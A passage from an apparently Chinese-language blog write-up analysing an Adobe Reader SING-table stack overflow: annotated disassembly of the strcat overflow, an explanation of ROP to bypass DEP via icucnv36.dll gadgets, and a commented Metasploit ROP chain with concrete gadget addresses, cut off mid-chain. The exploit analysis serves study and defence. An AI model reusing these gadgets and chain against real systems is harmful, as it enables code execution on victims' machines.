class="comment">; ebx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                </span><br><span class="line"><span class="symbol">.text:</span>0803DD9F         <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                         <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>     <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB         <span class="keyword">call</span>    strcat                           <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">;   eax=ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E46C]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6         <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                         <span class="comment">; this: ecx=ebx=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8         <span class="keyword">call</span>    sub_8001243</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *__thiscall sub_8001243(<span class="keyword">int</span> *this, <span class="keyword">int</span> uniqueName_buf)</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001243</span>         <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001244</span>         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; edi=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001245</span>         <span class="keyword">push</span>    [<span class="built_in">esp</span>+<span class="number">8</span>+uniqueName_buf]           <span class="comment">; [esp+0xc]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001249</span>         <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>                         <span class="comment">; esi = ecx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0800124B         <span class="keyword">call</span>    dword_8231220                    <span class="comment">; BIB.07005C59</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001251</span>         <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                         <span class="comment">; edi=eax=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001253</span>         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]                       <span class="comment">; eax = [esi]=[0x0012E608]=0x4A8A08C6,icucnv36 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001255</span>         <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001257</span>         <span class="keyword">pop</span>     <span class="built_in">ecx</span>                              <span class="comment">; ecx=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001258</span>         <span class="keyword">jz</span>      short loc_8001262                <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0800125A         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E45C]=eax = 0x4A8A08C6, &lt;----------</span></span><br><span class="line"><span class="symbol">.text:</span>0800125B         <span class="keyword">call</span>    dword_8231224                    <span class="comment">; BIB.07005CAF  </span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">07005CAF       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x4</span>]           <span class="comment">; ecx=[esp+4]=0x4A8A08C6 &lt;- arg1</span></span><br><span class="line">07005CB3       <span class="keyword">jmp</span> BIB.070013F2</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">**********************************************</span><br><span class="line"></span><br><span class="line">            BIB.070013F2()</span><br><span class="line"></span><br><span class="line">**********************************************</span><br><span class="line">070013F2       <span class="keyword">push</span> <span class="built_in">ebp</span>                                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line">070013F3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>                              <span class="comment">; ebp=esp=0x0012E454</span></span><br><span class="line">070013F5       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F6       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x1C</span>]          <span class="comment">; eax=0x4A8A08C6+0x1C=0x4A8A08E2 &lt;--------</span></span><br><span class="line">070013FA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span>           <span class="comment">; </span></span><br><span class="line">070013FD       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]           <span class="comment">; </span></span><br><span class="line"><span class="number">07001400</span>       <span class="keyword">lock</span> <span class="keyword">dec</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              <span class="comment">; [eax] = [0x4A8A08E2] = 0x00000000,减1变为0xFFFFFFFF &lt;--------</span></span><br><span class="line"><span class="number">07001403</span>       <span class="keyword">sete</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>]               <span class="comment">; 取标志寄存器中ZF的值, 赋值给[ebp-0x1] ebp=0012E454;[0012E450]=0x4A8A08C6-&gt;0x008A08C6</span></span><br><span class="line"><span class="number">07001407</span>       <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>],<span class="number">0x0</span>            <span class="comment">; ZF=1</span></span><br><span class="line">0700140B       <span class="keyword">je</span> short BIB<span class="meta">.07001412</span>                    <span class="comment">; 跳转实现</span></span><br><span class="line"><span class="number">0700140D</span>       <span class="keyword">call</span> BIB.070013B5                        <span class="comment">; 不执行</span></span><br><span class="line"><span class="number">07001412</span>       <span class="keyword">leave</span></span><br><span class="line"><span class="number">07001413</span>       <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过上面的调试信息,<code>BIB.070013F2()</code>函数中的地址<code>0x07001400</code>处的指令<code>lock dec dword ptr ds:[eax]</code>对<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>地址处的值进行了<code>读写</code>,所以<code>0x4A8A08C6+0x1C</code>处的值必须要具有<code>可读可写</code>权限。在<code>吾爱OllyDbg</code>的内存窗口,只能看到此地址具有<code>读权限</code>,而通过<code>Immunity Debugger</code>可以看到此地址处具有<code>读写权限</code>。</p><h5 id="2-6、样本中SING表数据“0x6C”的作用"><a href="#2-6、样本中SING表数据“0x6C”的作用" class="headerlink" title="2.6、样本中SING表数据“0x6C”的作用"></a>2.6、样本中SING表数据“0x6C”的作用</h5><p>TBD,样本中注释说是,如果没有这段数据,sub_801ba57()函数将会返回0。没有调试出来。</p><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-ROP绕过DEP"><a href="#0x41-ROP绕过DEP" class="headerlink" title="0x41 ROP绕过DEP"></a>0x41 ROP绕过DEP</h3><h4 id="1、阶段1：跳转到堆喷代码"><a href="#1、阶段1：跳转到堆喷代码" class="headerlink" title="1、阶段1：跳转到堆喷代码"></a>1、阶段1：跳转到堆喷代码</h4><p>&emsp;&emsp;<code>DEP</code>(Data Execution Prevention),即<code>数据执行保护</code>。开启后,<code>堆栈</code>是不具有<code>执行权限</code>的,所以不能直接在<code>缓冲区</code>中填入<code>Payload</code>。而<code>ROP</code>(Return-Oriented Programming),<code>返回导向编程</code>,则是通过程序中<code>已存在</code>的多段小的<code>代码片段(ROPgadget)</code>来控制程序执行流的。缓冲区中填入的只是<code>代码片段的首地址</code>。样本中使用了<code>两段ROPgadget</code>代码片段用于<code>绕过DEP</code>。<br><strong><code>ROPgadget1:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span> <span class="comment">; ebp=0x0012DD48+0x794=0x0012E4DC</span></span><br><span class="line">icucnv36.4A80CB3E    C9              <span class="keyword">leave</span>         <span class="comment">; 如下</span></span><br><span class="line">icucnv36.4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">leave:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span> <span class="comment">; esp=ebp=0x0012E4DC</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span>     <span class="comment">; esp=esp+0x4=0x0012E4E0 -&gt; ROPgadget2</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;执行到<code>0x0012E6D0</code>处的<code>ROPgadget1</code>时,<code>esp</code>(0x0012DD24)距离我们构造的<code>“uniqueName”字段</code>在栈上的<code>缓冲区的首地址</code>(0x0012E4D8)有<code>较远距离</code>,所以我们需要寻找一段可以调整<code>esp</code>至“uniqueName”字段缓冲区内的<code>ROPgadget</code>。上面这段<code>ROPgadget</code>先是通过修改<code>ebp</code>,让其落在“uniqueName”字段缓冲区内,然后通过<code>leave</code>指令,利用<code>ebp</code>来修改<code>esp</code>,使其指向<code>第二段ROPgadget</code>,再执行<code>ret</code>指令,跳转到<code>ROPgadget2</code>执行。</p><p><strong><code>ROPgadget2:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A82A712    FF50 5C         <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x5C</span>]</span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line">icucnv36.4A82A714    5C              <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">; esp=0x0C0C0C0C                       </span></span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段<code>ROPgadget</code>直接将<code>esp</code>指向<code>堆喷的ROP Chain</code>代码处,执行<code>ROP Chain</code>。原本这里的代码是<code>CALL</code>指令，机器码为<code>FF50 5C</code>,这里只截取了<code>5C</code>，所以指令变成了<code>pop esp</code>,成功控制EIP去执行<code>Heap Spray</code>处的<code>ROP Chain</code>。</p><p>接下来我们通过一张图来了解这个<code>ROP过程</code>：</p><div align="left"><img src="/resources/2018/2018-06-01-03.png" width="80%" height="70%" alt="漏洞利用ROP链"></div><p>&emsp;&emsp;前面说过,漏洞作者选取的这两个ROPgadget地址<code>0x4A82A714</code>和<code>0x4A80CB38</code>都位于<code>icucnv36.dll</code>的地址空间，而在<code>Adobe Reader</code>的各个版本上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p><h4 id="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"><a href="#2、阶段2：将真正的shellcode复制到可读可写可执行内存段" class="headerlink" title="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"></a>2、阶段2：将真正的shellcode复制到可读可写可执行内存段</h4><p>&emsp;&emsp;接下来我们来看看<code>堆喷的代码</code>是怎样<code>绕过DEP</code>的。我查看了<code>msf</code>用于<code>生成样本文件的模块</code>，其中如下的数据就是用于<code>绕过DEP</code>而构造的<code>ROP Chain</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">stack_data = [</span><br><span class="line">    <span class="number">0x41414141</span>,   <span class="comment"># unused,用于补齐堆块内容长度占用的4byte</span></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx ; ecx=0x4a8a0000,用于保存eax的地址</span></span><br><span class="line">  </span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as ; [ecx]=[0x4a8a0000]=eax,保存eax</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA) ; CreateFileA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileA</span></span><br><span class="line">    <span class="comment"># 创建或打开一个文件或I/O设备。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileA()的返回地址,</span></span><br><span class="line">    <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg   - lpFileName , pointer to "iso88591"</span></span><br><span class="line">    <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">    <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">    <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x0012E718,eax=0x00000304,eax&lt;-&gt;edi,edi保存返回值,文件句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#   and [esp+ebx*2],edi ; 应该只是用这句指令修改下一步要调用的函数的参数 </span></span><br><span class="line">    <span class="comment">#   jne check_slash</span></span><br><span class="line">    <span class="comment"># ret_one:</span></span><br><span class="line">    <span class="comment">#   mov al,1</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment"># check_slash:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment">#   cmp al,0x41</span></span><br><span class="line">    <span class="comment">#   jl check_lower</span></span><br><span class="line">    <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">    <span class="comment">#   jle check_ptr</span></span><br><span class="line">    <span class="comment"># check_lower:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x61</span></span><br><span class="line">    <span class="comment">#   jl ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">    <span class="comment">#   jg ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment"># ret_zero:</span></span><br><span class="line">    <span class="comment">#   xor al,al</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改CreateFileMappingA第一个参数为调用CreateFileA返回的文件句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA) ; CreateFileMappingA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">    <span class="comment"># 创建或打开指定文件的命名或未命名文件映射对象。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileMappingA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileMappingA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileMappingA()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFile ; CreateFileA返回的文件句柄</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># second arg  - lpAttributes</span></span><br><span class="line">    <span class="number">0x00000040</span>,   <span class="comment"># third arg   - flProtect</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwMaximumSizeHigh</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwMaximumSizeLow</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># sixth arg   - lpName</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x00000304,eax=0x00000320,edi&lt;-&gt;eax,edi保存返回值(0x320,文件映射对象的句柄。)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改MapViewOfFile第一个参数为调用CreateFileMappingA返回的文件映射对象的句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile) ; MapViewOfFile()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">    <span class="comment"># 将一个文件映射对象映射到当前应用程序的地址空间。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用MapViewOfFile()</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; MapViewOfFile()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFileMappingObject ; CreateFileMappingA返回的文件映射对象的句柄</span></span><br><span class="line">    <span class="number">0x00000022</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwFileOffsetHigh</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwFileOffsetLow</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer ; ecx=0x4a8a0004,可写指针,用于保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr ; [ecx]=[0x4a8a0004]=eax=0x03550000,保存文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x320,eax&lt;-&gt;edi,edi保存返回值(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x30,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy返回地址为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr ; eax=0x4a8a0004,保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr ; eax=[eax]=0x03550000,取文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x03550000,eax&lt;-&gt;edi(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x20,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第一个参数为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; 